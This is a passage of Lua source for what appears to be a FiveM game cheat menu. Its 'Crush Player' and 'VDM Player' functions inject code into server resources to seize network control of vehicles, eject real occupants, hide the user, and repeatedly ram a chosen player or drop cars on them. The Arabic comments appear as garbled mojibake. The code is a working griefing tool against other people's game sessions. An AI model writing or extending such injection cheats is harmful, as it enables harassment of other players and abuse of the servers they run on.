                        SetVehicleEnginePowerMultiplier(targetVehicle, 2.0)
                        ModifyVehicleTopSpeed(targetVehicle, 1.5)
                        
                        -- Position vehicle and attack ONCE
                        SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                        SetEntityHeading(targetVehicle, targetHeading + 180.0)
                        PlaceObjectOnGroundProperly(targetVehicle)
                        
                        SetVehicleForwardSpeed(targetVehicle, 35.0)
                        TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 40.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                        
                        -- Clean up after 5 seconds
                        Citizen.Wait(5000)
                        if DoesEntityExist(botPed) then
                            DeleteEntity(botPed)
                        end
                        SetModelAsNoLongerNeeded(botModel)
                    end
                end)
            ]])
            
            local targetName = GetPlayerName(selectedPlayer)
            MachoMenuNotification("VDM", "Single attack launched on " .. targetName .. " using nearby vehicle")
            
        else
            MachoMenuNotification("Error", "No empty vehicles found near target player!")
        end
    end
end)
MachoMenuButton(PlayerSection, "Crush Player", function()
    local selectedPlayer = MachoMenuGetSelectedPlayer()
    
    if not selectedPlayer then
        MachoMenuNotification("Error", "No player selected! Select a player from the list first.")
        return
    end
    
    local targetPed = GetPlayerPed(selectedPlayer)
    if not DoesEntityExist(targetPed) then
        MachoMenuNotification("Error", "Target player not found!")
        return
    end
    
    local playerPed = PlayerPedId()
    local originalPos = GetEntityCoords(playerPed)
    local originalHeading = GetEntityHeading(playerPed)
    local targetPos = GetEntityCoords(targetPed)
    
    -- Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø£Ù‚Ø±Ø¨ Ø³ÙŠØ§Ø±Ø© ÙØ§Ø±ØºØ©
    local closestEmptyVehicle = nil
    local closestDistance = 999999.0
    
    for vehicle in EnumerateVehicles() do
        if DoesEntityExist(vehicle) then
            local vehiclePos = GetEntityCoords(vehicle)
            local distance = #(targetPos - vehiclePos)
            
            if distance < 100.0 then
                local isVehicleEmpty = true
                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                
                for seat = -1, maxSeats do
                    local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                    if pedInSeat ~= 0 then
                        local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                        if playerId ~= -1 and IsPlayerActive(playerId) then
                            isVehicleEmpty = false
                            break
                        end
                    end
                end
                
                if isVehicleEmpty and distance < closestDistance then
                    closestEmptyVehicle = vehicle
                    closestDistance = distance
                end
            end
        end
    end
    
    if closestEmptyVehicle then
        -- Fast warp to get control
        SetEntityVisible(playerPed, false, false)
        ClearPedTasksImmediately(playerPed)
        TaskWarpPedIntoVehicle(playerPed, closestEmptyVehicle, -1)
        ClearPedTasksImmediately(playerPed)
        TaskLeaveVehicle(playerPed, closestEmptyVehicle, 0)
        SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
        SetEntityHeading(playerPed, originalHeading)
        SetEntityVisible(playerPed, true, false)
        
        -- Car drop attack using MachoInjectResource
        MachoInjectResource("any", [[
            Citizen.CreateThread(function()
                local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                local dropVehicle = ]] .. closestEmptyVehicle .. [[
                
                if DoesEntityExist(targetPed) and DoesEntityExist(dropVehicle) then
                    local targetPos = GetEntityCoords(targetPed)
                    
                    NetworkRequestControlOfEntity(dropVehicle)
                    SetEntityAsMissionEntity(dropVehicle, true, true)
                    
                    Citizen.Wait(100)
                    
                    -- Ø±ÙØ¹ Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙÙˆÙ‚ Ø§Ù„Ù‡Ø¯Ù Ø¨Ù€ 50 Ù…ØªØ±
                    local dropHeight = 50.0
                    local dropPos = vector3(targetPos.x, targetPos.y, targetPos.z + dropHeight)
                    
                    -- ÙˆØ¶Ø¹ Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙÙˆÙ‚ Ø§Ù„Ù‡Ø¯Ù
                    SetEntityCoordsNoOffset(dropVehicle, dropPos.x, dropPos.y, dropPos.z, false, false, false)
                    SetEntityHeading(dropVehicle, 0.0)
                    
                    -- Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ù…Ø­Ø±Ùƒ
                    SetVehicleEngineOn(dropVehicle, false, false, false)
                    
                    -- Ø¥Ø²Ø§Ù„Ø© Ø£ÙŠ Ù‚ÙˆÙ‰ Ø£Ùˆ Ø³Ø±Ø¹Ø§Øª
                    SetEntityVelocity(dropVehicle, 0.0, 0.0, 0.0)
                    SetVehicleForwardSpeed(dropVehicle, 0.0)
                    
                    -- ÙÙ‚Ø· ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø¬Ø§Ø°Ø¨ÙŠØ© - Ù„Ø§ force Ø¥Ø¶Ø§ÙÙŠØ©
                    SetEntityHasGravity(dropVehicle, true)
                    
                    -- Ù„Ø§ Ø­Ø§Ø¬Ø© Ù„Ø£ÙŠ ØªØ­Ø±ÙŠÙƒ Ø¥Ø¶Ø§ÙÙŠ - Ø§Ù„Ø¬Ø§Ø°Ø¨ÙŠØ© Ø³ØªØ³Ù‚Ø· Ø§Ù„Ø³ÙŠØ§Ø±Ø©
                    
                    Citizen.Wait(100)
                    
                    -- Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø£Ù† Ø§Ù„Ø³ÙŠØ§Ø±Ø© ØªØªØ¨Ø¹ Ù‚ÙˆØ§Ù†ÙŠÙ† Ø§Ù„ÙÙŠØ²ÙŠØ§Ø¡ Ø§Ù„Ø·Ø¨ÙŠØ¹ÙŠØ©
                    ActivatePhysics(dropVehicle)
                end
            end)
        ]])
        
        local targetName = GetPlayerName(selectedPlayer)
        MachoMenuNotification("Car Drop", "Dropping car on " .. targetName)
        
    else
        MachoMenuNotification("Error", "No empty vehicles found near target player!")
    end
end)
MachoMenuCheckbox(PlayerSection, "VDM Player",
    function()
        enableVDM = true
        local selectedPlayer = MachoMenuGetSelectedPlayer()  
        if selectedPlayer and selectedPlayer ~= -1 then      
            local targetPed = GetPlayerPed(selectedPlayer)  
            if targetPed and DoesEntityExist(targetPed) then
                local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                local originalTargetPlayer = selectedPlayer -- Ø­ÙØ¸ Ø§Ù„Ø´Ø®Øµ Ø§Ù„Ù…Ø®ØªØ§Ø± Ø£ØµÙ„Ø§Ù‹
               
                -- Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø´Ø®Øµ Ø§Ù„Ù…Ø®ØªØ§Ø± ÙÙŠ Ø³ÙŠØ§Ø±Ø©
                if targetVehicle ~= 0 then
                    local playerPed = PlayerPedId()
                    local originalPos = GetEntityCoords(playerPed)
                    local originalHeading = GetEntityHeading(playerPed)
                   
                    -- Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù† Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙØ§Ø±ØºØ© Ù…Ù† Ø§Ù„Ù„Ø§Ø¹Ø¨ÙŠÙ† Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠÙŠÙ†
                    local isVehicleEmpty = true
                    local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                   
                    for seat = -1, maxSeats do
                        local pedInSeat = GetPedInVehicleSeat(targetVehicle, seat)
                        if pedInSeat ~= 0 then
                            -- Simply check if there's any ped in the seat (removed IsPlayerActive check)
                            local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                            if playerId ~= -1 then
                                isVehicleEmpty = false
                                break
                            end
                        end
                    end
                   
                    if isVehicleEmpty then
                        -- Ø§Ù„Ø³ÙŠØ§Ø±Ø© ÙØ§Ø±ØºØ© - ÙˆØ§Ø±Ø¨ Ø³Ø±ÙŠØ¹ Ø¬Ø¯Ø§Ù‹ Ø¨Ø¯ÙˆÙ† Ø£ÙŠ Ø§Ù†ØªØ¸Ø§Ø±
                        local playerPed = PlayerPedId()
                        local originalPos = GetEntityCoords(playerPed)
                        local originalHeading = GetEntityHeading(playerPed)
                       
                        SetEntityVisible(playerPed, false, false)
                        ClearPedTasksImmediately(playerPed)
                        TaskWarpPedIntoVehicle(playerPed, targetVehicle, -1)
                        ClearPedTasksImmediately(playerPed)
                        TaskLeaveVehicle(playerPed, targetVehicle, 0)
                        SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                        SetEntityHeading(playerPed, originalHeading)
                        SetEntityVisible(playerPed, true, false)
                       
                        -- Ø¨Ø¯Ø¡ Ø§Ù„Ù€ VDM ÙÙˆØ±Ø§Ù‹
                        MachoInjectResource("any", [[
                            vdmActive = true
                            vdmBotPed = nil
                            vdmVehicle = nil
                            originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                           
                            Citizen.CreateThread(function()
                                local targetVehicle = ]] .. targetVehicle .. [[
                               
                                if DoesEntityExist(targetVehicle) and vdmActive then
                                    vdmVehicle = targetVehicle
                                   
                                    NetworkRequestControlOfEntity(targetVehicle)
                                    SetEntityAsMissionEntity(targetVehicle, true, true)
                                   
                                    SetVehicleDoorsLocked(targetVehicle, 4)
                                   
                                    -- Ø¥Ù†Ø´Ø§Ø¡ Ø¨ÙˆØª Ù„Ù„Ù‚ÙŠØ§Ø¯Ø©
                                    local botModel = GetHashKey("mp_m_freemode_01")
                                    RequestModel(botModel)
                                    while not HasModelLoaded(botModel) do
                                        if not vdmActive then return end
                                        Citizen.Wait(0)
                                    end
                                   
                                    if not vdmActive then return end
                                   
                                    local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                    vdmBotPed = botPed
                                   
                                    SetEntityAsMissionEntity(botPed, false, false)
                                    SetPedCanBeDraggedOut(botPed, false)
                                    SetPedConfigFlag(botPed, 32, true)
                                    SetPedFleeAttributes(botPed, 0, false)
                                    SetPedCombatAttributes(botPed, 17, true)
                                    SetPedSeeingRange(botPed, 0.0)
                                    SetPedHearingRange(botPed, 0.0)
                                    SetPedAlertness(botPed, 0)
                                    SetPedKeepTask(botPed, true)
                                    SetEntityCollision(botPed, false, false)
                                    SetEntityVisible(botPed, true, false)
                                    NetworkSetEntityInvisibleToNetwork(botPed, true)
                                   
                                    SetPedIntoVehicle(botPed, targetVehicle, -1)
                                   
                                    SetVehicleEngineOn(targetVehicle, true, true, false)
                                    SetVehicleEnginePowerMultiplier(targetVehicle, 1.5)
                                    ModifyVehicleTopSpeed(targetVehicle, 1.3)
                                   
                                    -- Ø­Ù„Ù‚Ø© VDM - ØªØ³ØªÙ‡Ø¯Ù Ø§Ù„Ø´Ø®Øµ Ø§Ù„Ù…Ø®ØªØ§Ø± Ø£ØµÙ„Ø§Ù‹
                                    Citizen.CreateThread(function()
                                        while DoesEntityExist(targetVehicle) and vdmActive do
                                            local originalTarget = GetPlayerPed(originalTargetPlayer)
                                            if DoesEntityExist(originalTarget) then
                                                local targetPos = GetEntityCoords(originalTarget)
                                                local targetHeading = GetEntityHeading(originalTarget)
                                                local forwardVec = GetEntityForwardVector(originalTarget)
                                                local spawnPos = targetPos + forwardVec * 15.0
                                               
                                                SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                                SetEntityHeading(targetVehicle, targetHeading + 180.0)
                                                PlaceObjectOnGroundProperly(targetVehicle)
                                               
                                                SetVehicleForwardSpeed(targetVehicle, 30.0)
                                                TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 35.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                                            end
                                           
                                            Citizen.Wait(1500)
                                        end
                                    end)
                                   
                                    SetModelAsNoLongerNeeded(botModel)
                                end
                            end)
                        ]])
                        MachoMenuNotification("Vehicle", "Fast Warp VDM activated - Hunting Player ID: " .. GetPlayerServerId(selectedPlayer))
                    else
                        -- Ø§Ù„Ø³ÙŠØ§Ø±Ø© Ù…Ø´ØºÙˆÙ„Ø© - Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø·Ø±ÙŠÙ‚Ø© Ø§Ù„Ø£ØµÙ„ÙŠØ© (same logic, IsPlayerActive removed)
                        ClearPedTasksImmediately(playerPed)
                       
                        local originalPos = GetEntityCoords(playerPed)
                        local originalHeading = GetEntityHeading(playerPed)
                       
                        MachoInjectResource("any", [[
                            -- Ø¨Ø§Ù‚ÙŠ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø£ØµÙ„ÙŠ Ù„Ù„Ø³ÙŠØ§Ø±Ø© Ø§Ù„Ù…Ø´ØºÙˆÙ„Ø©
                            vdmActive = true
                            vdmBotPed = nil
                            vdmVehicle = nil
                            originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                           
                            Citizen.CreateThread(function()
                                local playerPed = PlayerPedId()
                                local targetPed = GetPlayerPed(]] .. selectedPlayer .. [[)
                                local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                                local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                                local originalHeading = ]] .. originalHeading .. [[
                               
                                if targetVehicle ~= 0 then
                                    vdmVehicle = targetVehicle
                                   
                                    SetVehicleDoorsLocked(targetVehicle, 1)
                                    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                                   
                                    SetEntityVisible(playerPed, false, false)
                                    TaskLeaveVehicle(targetPed, targetVehicle, 0)
                                    SetPedMoveRateOverride(playerPed, 10.0)
                                    ClearPedTasks(playerPed)
                                    SetVehicleForwardSpeed(targetVehicle, 0.0)
                                    TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                                   
                                    local keepHidden = true
                                    Citizen.CreateThread(function()
                                        while keepHidden and vdmActive do
                                            SetEntityVisible(playerPed, false, false)
                                            Citizen.Wait(10)
                                        end
                                    end)
                                   
                                    -- Ø§Ù†ØªØ¸Ø§Ø± Ø­ØªÙ‰ ÙŠØ­ØµÙ„ Ø¹Ù„Ù‰ ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„Ø³ÙŠØ§Ø±Ø© ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ù…Ù† TaskEnterVehicle
                                    local controlAttempts = 0
                                    while not NetworkHasControlOfEntity(targetVehicle) and vdmActive and controlAttempts < 200 do
                                        Citizen.Wait(50)
                                        controlAttempts = controlAttempts + 1
                                    end
                                   
                                    Citizen.Wait(500)
                                    keepHidden = false
                                   
                                    if not vdmActive then return end
                                   
                                    ClearPedTasksImmediately(playerPed)
                                    SetEntityAsMissionEntity(playerPed, true, true)
                                    SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                    SetEntityHeading(playerPed, originalHeading)
                                   
                                    for i = 1, 50 do
                                        if not vdmActive then break end
                                        SetEntityVisible(playerPed, false, false)
                                        Citizen.Wait(10)
                                    end
                                   
                                    if not vdmActive then return end
                                   
                                    Citizen.Wait(100)
                                    ClearPedTasksImmediately(playerPed)
                                    SetPedMoveRateOverride(playerPed, 1.0)
                                    SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                                    TaskWanderStandard(playerPed, 0.0, 0)
                                    Citizen.Wait(100)
                                    ClearPedTasksImmediately(playerPed)
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(100)
                                   
                                    if not vdmActive then return end
                                   
                                    ClearPedTasksImmediately(playerPed)
                                    SetPedMoveRateOverride(playerPed, 1.0)
                                    SetEntityAsMissionEntity(playerPed, false, false)
                                    SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                    SetEntityHeading(playerPed, originalHeading)
                                    Citizen.Wait(100)
                                    TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                                    Citizen.Wait(600)
                                   
                                    if not vdmActive then return end
                                   
                                    ClearPedTasks(playerPed)
                                    SetEntityVisible(playerPed, true, false)
                                    Citizen.Wait(200)
                                   
                                    -- Ø¨Ø¯Ø¡ VDM Ø¨Ø¹Ø¯ Ø¹ÙˆØ¯Ø© Ø§Ù„Ù„Ø§Ø¹Ø¨
                                    if DoesEntityExist(targetVehicle) and vdmActive and NetworkHasControlOfEntity(targetVehicle) then
                                        SetEntityAsMissionEntity(targetVehicle, true, true)
                                        Citizen.Wait(100)
                                       
                                        if not vdmActive then return end
                                       
                                        SetVehicleDoorsLocked(targetVehicle, 4)
                                        local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(targetVehicle)) - 1
                                        for seat = 0, maxSeats do
                                            local ped = GetPedInVehicleSeat(targetVehicle, seat)
                                            if ped ~= 0 and ped ~= playerPed then
                                                SetPedCanBeDraggedOut(ped, false)
                                                SetPedConfigFlag(ped, 32, true)
                                                TaskWarpPedIntoVehicle(ped, targetVehicle, seat)
                                            end
                                        end
                                       
                                        -- Ø¥Ù†Ø´Ø§Ø¡ Ø¨ÙˆØª Ù„Ù„Ù‚ÙŠØ§Ø¯Ø©
                                        local botModel = GetHashKey("mp_m_freemode_01")
                                        RequestModel(botModel)
                                        while not HasModelLoaded(botModel) do
                                            if not vdmActive then return end
                                            Citizen.Wait(0)
                                        end
                                       
                                        if not vdmActive then return end
                                       
                                        local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                        vdmBotPed = botPed
                                       
                                        SetEntityAsMissionEntity(botPed, false, false)
                                        SetPedCanBeDraggedOut(botPed, false)
                                        SetPedConfigFlag(botPed, 32, true)
                                        SetPedFleeAttributes(botPed, 0, false)
                                        SetPedCombatAttributes(botPed, 17, true)
                                        SetPedSeeingRange(botPed, 0.0)
                                        SetPedHearingRange(botPed, 0.0)
                                        SetPedAlertness(botPed, 0)
                                        SetPedKeepTask(botPed, true)
                                        SetEntityCollision(botPed, false, false)
                                        SetEntityVisible(botPed, true, false)
                                        NetworkSetEntityInvisibleToNetwork(botPed, true)
                                       
                                        SetPedIntoVehicle(botPed, targetVehicle, -1)
                                        Citizen.Wait(100)
                                       
                                        if not vdmActive then
                                            if DoesEntityExist(botPed) then
                                                DeleteEntity(botPed)
                                            end
                                            return
                                        end
                                       
                                        SetVehicleDoorsLocked(targetVehicle, 4)
                                        SetVehicleEngineOn(targetVehicle, true, true, false)
                                        SetVehicleEnginePowerMultiplier(targetVehicle, 1.5)
                                        ModifyVehicleTopSpeed(targetVehicle, 1.3)
                                       
                                        -- Ø­Ù„Ù‚Ø© VDM
                                        Citizen.CreateThread(function()
                                            while DoesEntityExist(targetVehicle) and vdmActive do
                                                local originalTarget = GetPlayerPed(originalTargetPlayer)
                                                if DoesEntityExist(originalTarget) then
                                                    local targetPos = GetEntityCoords(originalTarget)
                                                    local targetHeading = GetEntityHeading(originalTarget)
                                                    local forwardVec = GetEntityForwardVector(originalTarget)
                                                    local spawnPos = targetPos + forwardVec * 15.0
                                                   
                                                    SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                                    SetEntityHeading(targetVehicle, targetHeading + 180.0)
                                                    PlaceObjectOnGroundProperly(targetVehicle)
                                                   
                                                    SetVehicleForwardSpeed(targetVehicle, 30.0)
                                                    TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 35.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                                                end
                                               
                                                Citizen.Wait(1500)
                                            end
                                        end)
                                       
                                        SetModelAsNoLongerNeeded(botModel)
                                    end
                                end
                            end)
                        ]])
                        MachoMenuNotification("Vehicle", "VDM Bot activated (occupied vehicle) - Hunting Player ID: " .. GetPlayerServerId(selectedPlayer))
                    end
               
                -- Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø´Ø®Øµ Ø§Ù„Ù…Ø®ØªØ§Ø± Ù„ÙŠØ³ ÙÙŠ Ø³ÙŠØ§Ø±Ø© - Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ù„Ø³ÙŠØ§Ø±Ø§Øª Ø§Ù„ÙØ§Ø±ØºØ©
                else
                    local playerPed = PlayerPedId()
                    local targetPos = GetEntityCoords(targetPed)
                    local originalPos = GetEntityCoords(playerPed)
                    local originalHeading = GetEntityHeading(playerPed)
                   
                    -- Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø£Ù‚Ø±Ø¨ Ø³ÙŠØ§Ø±Ø© ÙØ§Ø±ØºØ©
                    local closestEmptyVehicle = nil
                    local closestDistance = 999999.0
                   
                    for vehicle in EnumerateVehicles() do
                        if DoesEntityExist(vehicle) then
                            local vehiclePos = GetEntityCoords(vehicle)
                            local distance = #(targetPos - vehiclePos)
                           
                            if distance < 100.0 then
                                local isVehicleEmpty = true
                                local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                               
                                for seat = -1, maxSeats do
                                    local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                    if pedInSeat ~= 0 then
                                        local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                        if playerId ~= -1 then
                                            isVehicleEmpty = false
                                            break
                                        end
                                    end
                                end
                               
                                if isVehicleEmpty and distance < closestDistance then
                                    closestEmptyVehicle = vehicle
                                    closestDistance = distance
                                end
                            end
                        end
                    end
                   
                    if closestEmptyVehicle then
                        -- Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ÙˆØ§Ø±Ø¨ Ø§Ù„Ø³Ø±ÙŠØ¹ Ù„Ù„Ø³ÙŠØ§Ø±Ø© Ø§Ù„ÙØ§Ø±ØºØ©
                        SetEntityVisible(playerPed, false, false)
                        ClearPedTasksImmediately(playerPed)
                        TaskWarpPedIntoVehicle(playerPed, closestEmptyVehicle, -1)
                        ClearPedTasksImmediately(playerPed)
                        TaskLeaveVehicle(playerPed, closestEmptyVehicle, 0)
                        SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                        SetEntityHeading(playerPed, originalHeading)
                        SetEntityVisible(playerPed, true, false)
                       
                        MachoInjectResource("any", [[
                            vdmActive = true
                            vdmBotPed = nil
                            vdmVehicle = nil
                            originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                           
                            Citizen.CreateThread(function()
                                local targetVehicle = ]] .. closestEmptyVehicle .. [[
                               
                                if DoesEntityExist(targetVehicle) and vdmActive then
                                    vdmVehicle = targetVehicle
                                   
                                    NetworkRequestControlOfEntity(targetVehicle)
                                    SetEntityAsMissionEntity(targetVehicle, true, true)
                                   
                                    -- Ø¥Ù†Ø´Ø§Ø¡ Ø¨ÙˆØª Ù„Ù„Ù‚ÙŠØ§Ø¯Ø©
                                    local botModel = GetHashKey("mp_m_freemode_01")
                                    RequestModel(botModel)
                                    while not HasModelLoaded(botModel) do
                                        if not vdmActive then return end
                                        Citizen.Wait(0)
                                    end
                                   
                                    if not vdmActive then return end
                                   
                                    local botPed = CreatePed(4, botModel, 0.0, 0.0, 0.0, 0.0, false, false)
                                    vdmBotPed = botPed
                                   
                                    SetEntityAsMissionEntity(botPed, false, false)
                                    SetPedCanBeDraggedOut(botPed, false)
                                    SetPedConfigFlag(botPed, 32, true)
                                    SetPedFleeAttributes(botPed, 0, false)
                                    SetPedCombatAttributes(botPed, 17, true)
                                    SetPedSeeingRange(botPed, 0.0)
                                    SetPedHearingRange(botPed, 0.0)
                                    SetPedAlertness(botPed, 0)
                                    SetPedKeepTask(botPed, true)
                                    SetEntityCollision(botPed, false, false)
                                    SetEntityVisible(botPed, true, false)
                                    NetworkSetEntityInvisibleToNetwork(botPed, true)
                                   
                                    SetPedIntoVehicle(botPed, targetVehicle, -1)
                                   
                                    SetVehicleDoorsLocked(targetVehicle, 4)
                                    SetVehicleEngineOn(targetVehicle, true, true, false)
                                    SetVehicleEnginePowerMultiplier(targetVehicle, 1.5)
                                    ModifyVehicleTopSpeed(targetVehicle, 1.3)
                                   
                                    -- Ø­Ù„Ù‚Ø© VDM
                                    Citizen.CreateThread(function()
                                        while DoesEntityExist(targetVehicle) and vdmActive do
                                            local originalTarget = GetPlayerPed(originalTargetPlayer)
                                            if DoesEntityExist(originalTarget) then
                                                local targetPos = GetEntityCoords(originalTarget)
                                                local targetHeading = GetEntityHeading(originalTarget)
                                                local forwardVec = GetEntityForwardVector(originalTarget)
                                                local spawnPos = targetPos + forwardVec * 15.0
                                               
                                                SetEntityCoordsNoOffset(targetVehicle, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                                SetEntityHeading(targetVehicle, targetHeading + 180.0)
                                                PlaceObjectOnGroundProperly(targetVehicle)
                                               
                                                SetVehicleForwardSpeed(targetVehicle, 30.0)
                                                TaskVehicleDriveToCoord(botPed, targetVehicle, targetPos.x, targetPos.y, targetPos.z, 35.0, 0, GetEntityModel(targetVehicle), 786603, 1.0, true)
                                            end
                                           
                                            Citizen.Wait(1500)
                                        end
                                    end)
                                   
                                    SetModelAsNoLongerNeeded(botModel)
                                end
                            end)
                        ]])
                        MachoMenuNotification("Vehicle", "Fast Warp - Empty vehicle VDM activated targeting Player ID: " .. GetPlayerServerId(selectedPlayer))
                    else
                        -- Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø³ÙŠØ§Ø±Ø© ÙØ§Ø±ØºØ© - Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø£Ù‚Ø±Ø¨ Ø³ÙŠØ§Ø±Ø© Ø¨Ù‡Ø§ Ù„Ø§Ø¹Ø¨ Ø­Ù‚ÙŠÙ‚ÙŠ
                        local closestOccupiedVehicle = nil
                        local closestOccupiedDistance = 999999.0
                        local occupiedVehicleOwner = nil
                       
                        for vehicle in EnumerateVehicles() do
                            if DoesEntityExist(vehicle) then
                                local vehiclePos = GetEntityCoords(vehicle)
                                local distance = #(targetPos - vehiclePos)
                               
                                if distance < 100.0 then
                                    local maxSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle)) - 1
                                   
                                    for seat = -1, maxSeats do
                                        local pedInSeat = GetPedInVehicleSeat(vehicle, seat)
                                        if pedInSeat ~= 0 then
                                            local playerId = NetworkGetPlayerIndexFromPed(pedInSeat)
                                            if playerId ~= -1 and distance < closestOccupiedDistance then
                                                closestOccupiedVehicle = vehicle
                                                closestOccupiedDistance = distance
                                                occupiedVehicleOwner = playerId
                                                break
                                            end
                                        end
                                    end
                                end
                            end
                        end
                       
                        if closestOccupiedVehicle and occupiedVehicleOwner then
                            -- Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù†ÙØ³ Ø®ÙˆØ§Ø±Ø²Ù…ÙŠØ© TaskEnterVehicle Ù„Ù„Ø³ÙŠØ§Ø±Ø© Ø§Ù„Ù…Ø´ØºÙˆÙ„Ø©
                            ClearPedTasksImmediately(playerPed)
                           
                            MachoInjectResource("any", [[
                                vdmActive = true
                                vdmBotPed = nil
                                vdmVehicle = nil
                                originalTargetPlayer = ]] .. originalTargetPlayer .. [[
                               
                                Citizen.CreateThread(function()
                                    local playerPed = PlayerPedId()
                                    local targetVehicle = ]] .. closestOccupiedVehicle .. [[
                                    local vehicleOwnerPed = GetPlayerPed(]] .. occupiedVehicleOwner .. [[)
                                    local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                                    local originalHeading = ]] .. originalHeading .. [[
                                   
                                    if targetVehicle ~= 0 then
                                        vdmVehicle = targetVehicle
                                       
                                        SetVehicleDoorsLocked(targetVehicle, 1)
                                        SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                                       
                                        SetEntityVisible(playerPed, false, false)
                                        TaskLeaveVehicle(vehicleOwnerPed, targetVehicle, 0)
                                        SetPedMoveRateOverride(playerPed, 10.0)
                                        ClearPedTasks(playerPed)
                                        SetVehicleForwardSpeed(targetVehicle, 0.0)
                                        TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                                       
                                        local keepHidden = true
                                        Citizen.CreateThread(function()
                                            while keepHidden and vdmActive do
                                                SetEntityVisible(playerPed, false, false)
                                                Citizen.Wait(10)
                                            end
                                        end)
                                       
                                        -- Ø§Ù†ØªØ¸Ø§Ø± Ø­ØªÙ‰ ÙŠØ­ØµÙ„ Ø¹Ù„Ù‰ ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„Ø³ÙŠØ§Ø±Ø© ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ù…Ù† TaskEnterVehicle
                                        local controlAttempts = 0
                                        while not NetworkHasControlOfEntity(targetVehicle) and vdmActive and controlAttempts < 200 do
                                            Citizen.Wait(50)
                                            controlAttempts = controlAttempts + 1
                                        end
                                       
                                        Citizen.Wait(500)
                                        keepHidden = false
                                       
                                        if not vdmActive then return end
                                       
                                        ClearPedTasksImmediately(playerPed)
                                        SetEntityAsMissionEntity(playerPed, true, true)
                                        SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                                        SetEntityHeading(playerPed, originalHeading)
                                       
                                        for i = 1, 50 do
                                            if not vdmActive then break end
                                            SetEntityVisible(playerPed, false, false)
                                            Citizen.Wait(10)
                                        end
                                       
                                        if not vdmActive then return end
                                       
                                        Citizen.Wait(100)
                                        ClearPedTasksImmediately(playerPed)
                                        SetPedMoveRateOverride(playerPed, 1.0)
                                        SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                                        TaskWanderStandard(playerPed, 0.0, 0)
                                        Citizen.Wait(100)
                                        ClearPedTasksImmediately(playerPed)
                                        SetEntityVisible(playerPed, false, false)
